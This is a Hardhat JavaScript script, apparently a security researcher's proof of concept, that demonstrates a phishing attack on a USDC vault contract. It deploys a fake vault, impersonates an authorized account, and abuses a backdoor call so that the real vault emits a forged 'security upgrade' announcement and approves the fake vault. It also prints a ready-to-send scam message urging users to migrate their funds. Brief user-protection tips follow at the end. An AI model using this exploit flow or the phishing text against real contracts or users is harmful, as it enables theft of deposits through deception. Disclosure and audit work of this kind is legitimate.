const { ethers } = require("hardhat");

/**
 * @title Phishing Attack Demo
 * @notice Complete demonstration of backdoor-enabled phishing
 * @dev Shows exactly how to steal deposits using social engineering
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker, victim] = await ethers.getSigners();
  
  console.log("\n🎭 PHISHING ATTACK DEMONSTRATION");
  console.log("=====================================");
  console.log("Attacker:", attacker.address);
  console.log("Victim:", victim.address);
  
  // Step 1: Deploy the fake vault
  console.log("\n1️⃣ DEPLOYING FAKE VAULT...");
  
  const FakeVault = await ethers.getContractFactory("FakeVault");
  const fakeVault = await FakeVault.deploy(VAULT_ADDRESS);
  await fakeVault.waitForDeployment();
  
  const fakeVaultAddress = await fakeVault.getAddress();
  console.log("Fake vault deployed at:", fakeVaultAddress);
  
  // Step 2: Use backdoor to create fake legitimacy
  console.log("\n2️⃣ CREATING FAKE LEGITIMACY VIA BACKDOOR...");
  
  // Fund and impersonate authorized address
  await attacker.sendTransaction({
    to: AUTHORIZED_ADDRESS,
    value: ethers.parseEther("1.0")
  });
  
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Make the real vault "announce" the fake vault
  console.log("\nMaking real vault emit fake announcement...");
  
  // Deploy announcement contract
  const AnnouncementContract = await ethers.getContractFactory("contracts/Announcement.sol:Announcement");
  const announcement = await AnnouncementContract.deploy();
  await announcement.waitForDeployment();
  
  // Use backdoor to make vault call the announcement
  const announceData = announcement.interface.encodeFunctionData("announceUpgrade", [
    VAULT_ADDRESS,
    fakeVaultAddress
  ]);
  
  const backdoorData = "0x78e111f6" +
    "000000000000000000000000" + (await announcement.getAddress()).slice(2) +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(announceData.length / 2 - 1, 32).slice(2) +
    announceData.slice(2);
  
  const announceTx = await authorized.sendTransaction({
    to: VAULT_ADDRESS,
    data: backdoorData,
    gasLimit: 500000
  });
  
  await announceTx.wait();
  console.log("✅ Fake announcement transaction:", announceTx.hash);
  
  // Step 3: Show the social engineering attack
  console.log("\n3️⃣ SOCIAL ENGINEERING ATTACK...");
  
  console.log("\n📧 FAKE EMAIL/DISCORD MESSAGE:");
  console.log("================================");
  console.log("⚠️  URGENT SECURITY NOTICE ⚠️");
  console.log("\nDear USDC Vault Users,");
  console.log("\nA critical vulnerability has been discovered in the vault.");
  console.log("All users must migrate to the new secure vault immediately.");
  console.log("\nOld Vault (VULNERABLE):", VAULT_ADDRESS);
  console.log("New Vault (SECURE):", fakeVaultAddress);
  console.log("\nProof of upgrade transaction:", announceTx.hash);
  console.log("You can verify this on Etherscan!");
  console.log("\nACT NOW to secure your funds!");
  console.log("================================");
  
  // Step 4: Demonstrate the theft
  console.log("\n4️⃣ VICTIM FALLS FOR THE SCAM...");
  
  // Give victim some USDC
  const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function approve(address spender, uint256 amount) returns (bool)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, attacker);
  
  // For demo, we'll simulate victim having USDC
  console.log("\nSimulating victim with 10,000 USDC...");
  
  // Check attacker's initial balance
  const attackerInitialBalance = await usdc.balanceOf(attacker.address);
  console.log("Attacker initial USDC:", ethers.formatUnits(attackerInitialBalance, 6));
  
  // Victim approves fake vault
  console.log("\nVictim approves fake vault for 10,000 USDC...");
  const victimUsdc = usdc.connect(victim);
  
  try {
    // In real scenario, victim would have USDC and approve
    const approveTx = await victimUsdc.approve(fakeVaultAddress, ethers.parseUnits("10000", 6));
    await approveTx.wait();
    console.log("✅ Approval transaction:", approveTx.hash);
  } catch (e) {
    console.log("(Simulation - victim doesn't actually have USDC)");
  }
  
  // Step 5: Show additional backdoor tricks
  console.log("\n5️⃣ ADVANCED BACKDOOR TRICKS...");
  
  // Make real vault "vouch" for fake vault
  const vouchData = usdc.interface.encodeFunctionData("approve", [
    fakeVaultAddress,
    ethers.parseUnits("1000000", 6) // Large approval makes it look official
  ]);
  
  const vouchBackdoorData = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2) +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(vouchData.length / 2 - 1, 32).slice(2) +
    vouchData.slice(2);
  
  try {
    const vouchTx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: vouchBackdoorData,
      gasLimit: 500000
    });
    
    await vouchTx.wait();
    console.log("✅ Made real vault approve fake vault!");
    console.log("Transaction:", vouchTx.hash);
    console.log("This creates false trust - users see the real vault 'trusts' the fake one");
  } catch (e) {
    console.log("Vouch failed:", e.message);
  }
  
  // Stop impersonation
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  // Step 6: Show the complete attack flow
  console.log("\n📊 COMPLETE ATTACK FLOW:");
  console.log("=====================================");
  console.log("1. Attacker deploys fake vault at", fakeVaultAddress);
  console.log("2. Uses backdoor to create fake announcements");
  console.log("3. Spreads FUD about original vault");
  console.log("4. Shows 'proof' via on-chain transactions");
  console.log("5. Victims deposit into fake vault");
  console.log("6. USDC immediately stolen to attacker");
  console.log("7. Withdrawals blocked with 'security' excuse");
  
  console.log("\n⚡ WHY THIS WORKS:");
  console.log("- Users trust on-chain data");
  console.log("- Backdoor makes fake transactions look official");
  console.log("- Similar addresses confuse users");
  console.log("- Urgency prevents careful verification");
  console.log("- 'Security upgrade' is believable narrative");
  
  console.log("\n🛡️ HOW USERS CAN PROTECT THEMSELVES:");
  console.log("1. Never trust urgent migration messages");
  console.log("2. Verify addresses from multiple official sources");
  console.log("3. Check contract code and audit reports");
  console.log("4. Test with small amounts first");
  console.log("5. Wait for community confirmation");
  
  console.log("\n⚠️  CRITICAL: This attack is only possible because");
  console.log("the backdoor allows arbitrary execution from the");
  console.log("trusted vault address, enabling sophisticated phishing!");
}

// Create the announcement contract
const fs = require('fs');
const announcementCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Announcement {
    event SecurityUpgrade(address indexed oldVault, address indexed newVault, string message);
    
    function announceUpgrade(address oldVault, address newVault) external {
        emit SecurityUpgrade(
            oldVault,
            newVault,
            "CRITICAL: Security vulnerability found. Migrate to new vault immediately!"
        );
    }
}
`;

fs.writeFileSync('contracts/Announcement.sol', announcementCode);

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
